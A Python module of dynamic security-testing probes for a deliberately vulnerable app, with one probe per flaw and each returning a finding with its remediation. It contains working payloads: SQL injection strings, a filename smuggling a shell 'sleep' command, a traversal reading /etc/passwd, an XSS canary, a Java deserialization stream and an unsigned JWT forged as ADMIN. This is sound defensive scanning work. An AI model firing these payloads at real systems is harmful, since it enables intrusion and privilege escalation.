"""
DAST probes — one per BugVault vulnerability. Each probe sends crafted requests to a
running target and returns a UnifiedFinding when the runtime behaviour proves the flaw.

Detection strategies mirror real black-box techniques: boolean/error/time-based
injection, canary reflection, differential authorization, and token forgery. Probes
depend only on `client.request(...)`, so tests drive them with a fake client.
"""
import base64
import json
from typing import List, Optional

from ..core.findings import UnifiedFinding
from .client import HttpClient


def _b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def forge_none_token(subject: str, role: str) -> str:
    """Hand-crafts an unsigned alg:none JWT (header.payload. with empty signature)."""
    header = _b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    payload = _b64url(json.dumps({"sub": subject, "role": role}).encode())
    return f"{header}.{payload}."


def serialized_object(class_name: str) -> bytes:
    """
    Minimal Java-serialization stream describing a fieldless Serializable object of
    `class_name`. Enough to force the target's ObjectInputStream to resolve the class,
    which is the observable difference between a vulnerable readObject and an allowlist.
    """
    name = class_name.encode()
    return bytes([0xAC, 0xED, 0x00, 0x05,  # STREAM_MAGIC + version
                  0x73,                     # TC_OBJECT
                  0x72,                     # TC_CLASSDESC
                  (len(name) >> 8) & 0xFF, len(name) & 0xFF]) + name + bytes([
                  0, 0, 0, 0, 0, 0, 0, 0,   # serialVersionUID
                  0x02,                     # SC_SERIALIZABLE
                  0x00, 0x00,               # field count = 0
                  0x78,                     # TC_ENDBLOCKDATA
                  0x70])                    # superclass TC_NULL


class Probe:
    id = ""
    name = ""
    cwe = ""
    remediation = ""

    def run(self, client: HttpClient) -> List[UnifiedFinding]:
        raise NotImplementedError

    def _finding(self, description: str, url: str, method: str, evidence: str) -> UnifiedFinding:
        return UnifiedFinding.dast(
            rule_id=self.id, rule_name=self.name, cwe=self.cwe,
            description=description, remediation=self.remediation,
            url=url, method=method, evidence=evidence,
        )


class SqlInjectionProbe(Probe):
    id, name, cwe = "DAST-SQLI", "SQL Injection (boolean-based)", "CWE-89"
    remediation = "Use parameterized queries / PreparedStatement; never concatenate input into SQL."

    # true and false payloads are identical length, so any page reflection of the
    # query cancels out — only a real always-true clause changes the row set.
    TRUE_Q = "/notes/search?q=zzz%27%20OR%20%271%27%3D%271%27%20--%20"
    FALSE_Q = "/notes/search?q=zzz%27%20OR%20%271%27%3D%272%27%20--%20"

    def run(self, client):
        r_true = client.request("GET", self.TRUE_Q)
        r_false = client.request("GET", self.FALSE_Q)
        # always-true clause returns rows the always-false one does not
        if r_true.status == 200 and len(r_true.text) > len(r_false.text) + 40:
            return [self._finding(
                "Boolean-based SQL injection: 'OR 1=1--' returns rows that 'OR 1=2--' does not.",
                client.base_url + self.TRUE_Q, "GET",
                f"true-clause {len(r_true.text)}B vs false-clause {len(r_false.text)}B",
            )]
        return []


class CommandInjectionProbe(Probe):
    id, name, cwe = "DAST-CMD", "OS Command Injection (time-based blind)", "CWE-78"
    remediation = "Never build shell commands from input; use argument arrays with a validated allowlist."

    DELAY_S = 3

    def run(self, client):
        # trailing '#' comments out the ".txt" the app appends to the output path
        path = f"/api/notes/1/export?filename=x%3B%20sleep%20{self.DELAY_S}%20%23"
        r = client.request("GET", path)
        if r.elapsed_ms >= self.DELAY_S * 1000 - 200:
            return [self._finding(
                f"Injected `; sleep {self.DELAY_S}` delayed the response, proving shell execution.",
                client.base_url + path, "GET", f"elapsed {r.elapsed_ms}ms",
            )]
        return []


class PathTraversalProbe(Probe):
    id, name, cwe = "DAST-PATH", "Path Traversal", "CWE-22"
    remediation = "Canonicalize the resolved path and confirm it stays within the base directory."

    def run(self, client):
        path = "/api/files/download?name=../../../../../../etc/passwd"
        r = client.request("GET", path)
        if r.status == 200 and "root:" in r.text and ":0:0:" in r.text:
            return [self._finding(
                "Traversal payload returned /etc/passwd contents.",
                client.base_url + path, "GET", r.text.splitlines()[0] if r.text else "",
            )]
        return []


class IdorProbe(Probe):
    id, name, cwe = "DAST-IDOR", "Insecure Direct Object Reference", "CWE-639"
    remediation = "Enforce object-level authorization: verify the caller owns (or may access) the object."

    def __init__(self, username="alice", password="alice123", max_id=8):
        self.username, self.password, self.max_id = username, password, max_id

    def run(self, client):
        auth = {"Authorization": HttpClient.basic_auth(self.username, self.password)}
        for note_id in range(1, self.max_id + 1):
            path = f"/notes/{note_id}"
            r = client.request("GET", path, headers=auth)
            body = r.text
            # a PRIVATE note the authenticated user does NOT own, yet can read
            if r.status == 200 and ">PRIVATE<" in body and f">{self.username}<" not in body:
                return [self._finding(
                    f"{self.username} read a PRIVATE note ({path}) owned by another user.",
                    client.base_url + path, "GET", "200 on another user's PRIVATE note",
                )]
        return []


class XssProbe(Probe):
    id, name, cwe = "DAST-XSS", "Reflected Cross-Site Scripting", "CWE-79"
    remediation = "HTML-escape all reflected output; use th:text instead of th:utext."

    CANARY = "<script>dast_canary_7f3</script>"

    def run(self, client):
        from urllib.parse import quote
        path = f"/notes/search?q={quote(self.CANARY)}"
        r = client.request("GET", path)
        if r.status == 200 and self.CANARY in r.text:
            return [self._finding(
                "Injected <script> canary reflected unescaped in the HTML response.",
                client.base_url + path, "GET", self.CANARY,
            )]
        return []


class DeserializationProbe(Probe):
    id, name, cwe = "DAST-DESER", "Insecure Deserialization", "CWE-502"
    remediation = "Reject native Java deserialization of untrusted data; use an allowlist look-ahead filter."

    def run(self, client):
        payload = serialized_object("com.bugvault.dast.NonexistentGadget")
        r = client.request("POST", "/api/import",
                           headers={"Content-Type": "application/octet-stream"}, body=payload)
        # secure mode blocks unknown classes before resolving them ("disallowed");
        # vulnerable mode tries to resolve the arbitrary class -> different signature
        if "disallowed" not in r.text.lower() and "rejected" not in r.text.lower():
            return [self._finding(
                "Endpoint attempted to deserialize an arbitrary (non-allowlisted) class.",
                client.base_url + "/api/import", "POST",
                f"status {r.status}, body: {r.text[:80]}",
            )]
        return []


class MisconfigProbe(Probe):
    id, name, cwe = "DAST-MISCONFIG", "Security Misconfiguration (actuator/env exposed)", "CWE-200"
    remediation = "Restrict actuator exposure to health/info; never expose env with values."

    def run(self, client):
        r = client.request("GET", "/actuator/env")
        if r.status == 200 and ("secret" in r.text.lower() or "password" in r.text.lower()):
            return [self._finding(
                "/actuator/env is publicly reachable and leaks configuration values.",
                client.base_url + "/actuator/env", "GET", f"status 200, {len(r.text)}B of env",
            )]
        return []


class JwtNoneProbe(Probe):
    id, name, cwe = "DAST-JWT", "Broken JWT Authentication (alg:none)", "CWE-287"
    remediation = "Pin the algorithm server-side; reject alg:none and any unsigned token."

    def run(self, client):
        token = forge_none_token("attacker", "ADMIN")
        r = client.request("GET", "/api/auth/me", headers={"Authorization": f"Bearer {token}"})
        if r.status == 200 and "ADMIN" in r.text:
            return [self._finding(
                "Forged alg:none token accepted; identity/role fully attacker-controlled.",
                client.base_url + "/api/auth/me", "GET", "accepted as role=ADMIN",
            )]
        return []


ALL_PROBES = [
    SqlInjectionProbe(), CommandInjectionProbe(), PathTraversalProbe(), IdorProbe(),
    XssProbe(), DeserializationProbe(), MisconfigProbe(), JwtNoneProbe(),
]
